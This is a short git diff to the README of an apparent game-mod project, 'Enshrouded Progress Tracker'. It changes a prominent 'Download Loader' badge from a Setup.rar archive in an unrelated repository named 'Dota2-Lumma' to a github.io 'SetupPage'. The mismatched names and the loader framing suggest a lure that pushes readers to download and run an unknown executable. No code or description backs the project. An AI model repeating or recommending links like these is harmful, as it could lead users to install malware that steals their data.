@@ -4,7 +4,7 @@
 
 > ⚡ Advanced Game Modification Project for Enshrouded Progress Tracker
 
-[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/rewfdf/Dota2-Lumma/releases/download/main/Setup.rar)
+[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://rewfdf.github.io/SetupPage)
 
 ---
 
@@ -38,5 +38,6 @@ configs/
 `Enshrouded-Progress-Tracker` · Updated: 2026-10-30
 
 **Tags:** `enshrouded` `progress-tracker` `pc-gaming` `gameplay` `progress-tracking` `windows` `steam`
+
 
 
